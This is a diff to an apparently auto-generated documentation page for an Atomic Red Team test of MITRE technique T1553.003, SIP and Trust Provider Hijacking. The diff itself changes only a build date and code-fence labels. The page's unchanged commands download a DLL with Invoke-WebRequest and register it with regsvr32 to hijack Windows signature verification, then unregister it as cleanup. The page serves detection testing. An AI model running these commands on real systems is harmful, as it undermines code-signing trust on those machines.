@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1553.003"
 attack_technique_name: "Subvert Trust Controls: SIP and Trust Provider Hijacking"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1553.003/T1553.003.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "command_prompt"
 aliases:
   - "e12f5d8d-574a-4e9d-8a84-c0e8b4a8a675"
@@ -54,13 +54,13 @@ GTSIPProvider.dll must exist on disk at specified location (#{dll_payload})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{dll_payload}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{dll_payload}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa5ee0c404084177f24/SIP/GTSIPProvider.dll" -OutFile "#{dll_payload}"
 ```
@@ -72,13 +72,13 @@ Invoke-WebRequest "https://github.com/gtworek/PSBits/raw/2aa885c7d09f7f100997bfa
 
 ### Command
 
-```commandprompt
+```cmd
 regsvr32.exe #{dll_payload}
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 regsvr32.exe /u #{dll_payload}
 ```
 
